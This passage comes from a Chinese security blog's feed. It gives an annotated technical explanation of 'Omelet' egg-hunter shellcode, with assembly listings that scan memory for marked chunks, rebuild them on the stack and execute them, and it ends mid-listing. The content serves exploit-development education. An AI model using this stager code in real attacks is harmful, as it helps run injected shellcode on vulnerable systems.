class=&quot;line&quot;&gt;┗━━━━━━━━━━━━┛&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;更多信息可参见我之前翻译的&lt;a href=&quot;http://bbs.pediy.com/showthread.php?t=104707&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;《绕过SEHOP安全机制》&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;结论&quot;&gt;&lt;a href=&quot;#结论&quot; class=&quot;headerlink&quot; title=&quot;结论&quot;&gt;&lt;/a&gt;结论&lt;/h2&gt;&lt;p&gt;本文简单地叙述了windows平台上的各类溢出保护机制及其绕过方法，但若结合实例分析的话，没有几万字是不可能完成的，因此这里概览一番，读者若想获得相关的实例运用的资料，可参考文中提及一些paper，特别是由看雪论坛上dge兄弟翻译的《Exploit编写系列教程6》以及黑客杂志《Phrack》、《Uninformed》上的相关论文。微软与黑客之间的斗争是永无休止的，我们期待着下一项安全机制的出现……&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;By  : riusksk（泉哥）&lt;br&gt;Blog: &lt;a href=&quot;http://riusksk.blogbus.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://riusksk.blogbus.com&lt;/a&gt;&lt;br&gt;Data: 第1
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="Windows" scheme="http://riusksk.github.io/tags/Windows/"/>
    
      <category term="溢出" scheme="http://riusksk.github.io/tags/%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>Shellcode分段执行技术原理</title>
    <link href="http://riusksk.github.io/2010/12/23/shellcode-split/"/>
    <id>http://riusksk.github.io/2010/12/23/shellcode-split/</id>
    <published>2010-12-22T16:00:00.000Z</published>
    <updated>2016-06-22T07:07:04.000Z</updated>
    
    <content type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;由于在实际溢出利用中，我们可能会遇到内存中没有足够的空间来存放我们的shellcode，但我们又可以控制多块小内存空间的内容，那些此时我们就可使用shellcode分段执行技术来进行利用，这种方法在国外被称为“Omelet Shellcode”，属于egg hunt shellcode的一种形式，它先在用户地址空间中寻找与其相匹配的各个小内存块（egg），然后再将其重构成一块大块的shellcode，最后执行它。此项技术最初是由荷兰著名黑客SkyLined在其主页上公布的（具体代码参见附件），该黑客先前就职于Microsoft，但于2008年初转入Google，同时他也是著名的字母数字型shellcode编码器Alpha2/Alpha3的开发者。&lt;/p&gt;
&lt;h3 id=&quot;原理分析&quot;&gt;&lt;a href=&quot;#原理分析&quot; class=&quot;headerlink&quot; title=&quot;原理分析&quot;&gt;&lt;/a&gt;原理分析&lt;/h3&gt;&lt;p&gt;将Shellcode拆分成固定大小的多个代码块，各个代码块中包含有其字节大小size，索引值index，标记marker（3 字节）和数据内容data，如图1所示：&lt;/p&gt;
&lt;p&gt;&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/shellcode/data.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;            图1&lt;br&gt;&lt;/center&gt;&lt;br&gt;当egghunter代码开始执行时，它会在用户内存空间中（0x00000000~0x80000000）搜索这些被标记的小块，然后在内存中重构成最初的shellcode并执行它。而当shellcode执行时，它还会安装SEH以处理访问违例时的情况。若出现访问违例，则SEH handler会将地址与0xFFF进行或运算，然后再加1，相当于进入下一内存页，以跳过不可读取的内存页。如果搜索的内存地址大于0x7FFFFFFF，那么终止搜索，并在内存中重构shellcode用于执行，否则重置栈空间，防止因递归进行异常处理而将栈空间耗尽，它会重新设置SEH handler并继续搜索内存。相应代码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;reset_stack:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;; 重置栈空间以防止递归进行异常处理时耗尽栈空间，并设置自己的异常处理例程以处理扫描内存时出现的访问违例情况&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    XOR     EAX, EAX                    ; EAX = 0，并作为计数器&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    MOV     ECX, [FS:EAX]               ; ECX = SEH结构链表&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;find_last_SEH_loop:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    MOV     ESP, ECX                    ; ESP = SEH结构&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    POP     ECX                         ; ECX = 下一个SEH结构指针&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    CMP     ECX, 0xFFFFFFFF             ; 判断是否是最后一个SEH结构&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    JNE     find_last_SEH_loop          ; 不是则跳走并继续查找&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    POP     EDX                         ; 最后一个SEH结构中的异常处理例程handler&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    CALL    create_SEH_handler          ; 自定义SEH handler&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;SEH_handler:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    POPA                                ; ESI = [ESP + 4] -&amp;gt; struct exception_info&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    LEA     ESP, [BYTE ESI+0x18]        ; ESP = struct exception_info-&amp;gt;exception_address&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    POP     EAX                         ; EAX = exception address 0x????????&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    OR      AX, 0xFFF                   ; EAX = 0x?????FFF&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    INC     EAX                         ; EAX = 0x?????FFF + 1 -&amp;gt; next page&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    JS      done                        ; EAX &amp;gt; 0x7FFFFFFF ===&amp;gt; done&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    XCHG    EAX, EDI                    ; EDI =&amp;gt; next page&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    JMP     reset_stack&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;当从地址0x00000000开始搜索后，若找到以相匹配的egg_size开头的egg内存块，它会将接下的DWORD值与一个特殊值（3字节的标记值和1字节的0xFF）相异或，如果是我们要找的egg内存块，那么获取的结果会等于内存块的索引号（从0开始），比如第二块egg内存块的这个DWORD值为0xBADA55FE，那么它与0xBADA55FF相异或后值为1。如果不是相匹配的egg内存块，则继续搜索下一字节。对应的代码如下所示：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;create_SEH_handler:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    PUSH    ECX                         ; 指向下一个SEH结构，这里为0xFFFFFFFF&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    MOV     [FS:EAX], ESP               ; 设置当前的SEH为自定义的SEH_handler&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    CLD                                 ; 清除方向标志位DF，从0开始扫描内存&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;scan_loop:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    MOV     AL, egg_size                ; EAX = egg_size&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;egg_size_location equ $-1 - $$&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    REPNE   SCASB                       ; 从地址0x00000000开始循环扫描以egg_size字节开头的内存块&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    PUSH    EAX                         ; 找到后保存egg_size&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    MOV     ESI, EDI                    ; ESI = 相匹配内存块的地址&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    LODSD                               ; EAX = II M2 M3 M4，索引值（1字节）与标记值（3字节）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    XOR     EAX, (marker &amp;lt;&amp;lt; 8) + 0xFF   ; EAX = (II M2 M3 M4) ^ (FF M2 M3 M4) == egg_index&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;marker_bytes_location equ $-3 - $$&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    CMP     EAX, BYTE max_index         ; 检测EAX值是否小于 max_index&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;max_index_location equ $-1 - $$&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    JA      reset_stack                 ; 不是则跳走并继续搜索内存&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;找到egg内存块后，将内存块大小egg_size与索引值egg_index相乘可得到该内存块在原始shellcode中的偏移egg_offset，然后将它再加上存放shellcode的栈空间起始地址，最后得到绝对地址，并将该egg内存块复制到绝对地址上，直至所有的egg内存块全部复制到栈上，进而在栈上重构出完整的shellcode。其对应代码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt; POP     ECX                         ; ECX = egg_size&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IMUL    ECX                         ; EAX = egg_size * egg_index == egg_offset&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                        ; 这里是有带符号相乘，由于ECX * EAX总小于0x1000000，所以EDX=0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ADD     EAX, [BYTE FS:EDX + 8]      ; EDI += Bottom of stack == position of egg in shellcode.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    XCHG    EAX, EDI&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;copy_loop:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    REP     MOVSB                       ; 将匹配的内存块复制到栈空间以重构成完整的shellcode&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    MOV     EDI, ESI                    ; EDI指向当前匹配内存块的末尾，在拷贝完第一块内存块后继续搜索第二块，&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                        ; 以此类推，直至所有的内存块全部搜索到并复制到栈上&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;最后就是跳到栈底去执行重构后的shellcode：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;done:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    XOR     EAX, EAX                    ; EAX = 0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    CALL    [BYTE FS:EAX + 8]           ; 从栈中shellcode的起始地址开始执行&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这样就完成了对各段egg内存块的搜索，并重构出完整shellcode来执行。&lt;br&gt;注意：由于此份代码只搜索0x00000000~0x80000000之间的用户内存空间，因此对于开启/3Gb（0x00000000~0xC000000）开关的系统并不适用，若应用在这样的系统上就可能会导致部分egg内存块未搜索到，以致无法正确地执行shellcode。&lt;br&gt;        在2010年8月，由Exploit编写系列教程的作者Peter Van Eeckhoutte编写的egg-to-omelet hunter程序在其博客上公布了（详细源码参见附件），此份程序对原先由SkyLined编写的omelet hunter进行了改进，提高其成功率和稳定性。此份程序先从当前栈桢的末尾 (0x….ffff) 开始搜索，为了避免出现NULL字节，又让egg内存块数量nr_egg加1，因此我们还可以让它与1相比较，然后去搜索保存在eax中的内存块标记tag，此标记类似这样：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;773030&amp;lt;seq&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;这里seq = 1 + number_of_remaining_eggs_to_find + 1，比如你有3个egg内存块，那么各块egg对应的tag分别为 ：&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Egg 1 : 77 30 30 05&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Egg 2 : 77 30 30 04&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Egg 3 : 77 30 30 03&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在搜索过程中，它通过调用NtAccessCheckAndAuditAlarm来判断是否出现访问违例，出错则重新搜索，否则就继续寻找各内存块标记tag，找到后通过rep movsb指令将其复制到edi指向的地址中，进而重组原始shellcode并进行执行。具体源码分析如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;74&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;BITS 32 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;nr_eggs equ 0x2             ; egg内存块的数量&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;egg_size equ 0x7b           ; 每一egg内存块占127字节 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;jmp short start &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;get_target_loc:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                            &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;push esp&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pop edi                        ; 将栈顶指针esp保存在edi中&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                            &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;or di,0xffff                ; edi=0x....ffff，即当前栈桢的末尾&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mov edx,edi                 ; edx=搜索的起始地址&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xor eax,eax                 ; eax清零&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mov al,nr_eggs              ; eax = 内存块数量&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;calc_target_loc:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xor esi,esi                 ; esi=0，作为计数器&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mov si,0-(egg_size+20)      ; 为每一块egg内存块添加20字节的额外空间&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;get_target_loc_loop:        &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dec edi                     ; 往回遍历搜索当前栈桢&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;inc esi                     ; 递增计数器&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cmp si,-1                   ; 继续往回遍历直到ESI = -1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;jnz get_target_loc_loop&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dec eax                     ; 若未找到所有的内存块则跳走并继续循环，&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;jnz calc_target_loc            ; 否则edi就指向了重组shellcode将保存的地址&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xor ebx,ebx                 ; ebx清零，作为计数器&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mov bl,nr_eggs+1            ; ebx = nr_eggs + 1，但为了避免出现NULL字节，&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                            ; 因此这里从1开始计数&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ret &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;start:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;call get_target_loc         ; 计算出重组shellcode将保存的栈地址 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;jmp short search_next_address&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;find_egg:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dec edx                     ; 由于下面搜索是以DWORD（4字节）为单位进行字节扫描的&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dec edx                        ; 因此这里需要edx-4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dec edx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dec edx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;search_next_address:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;inc edx                     ; 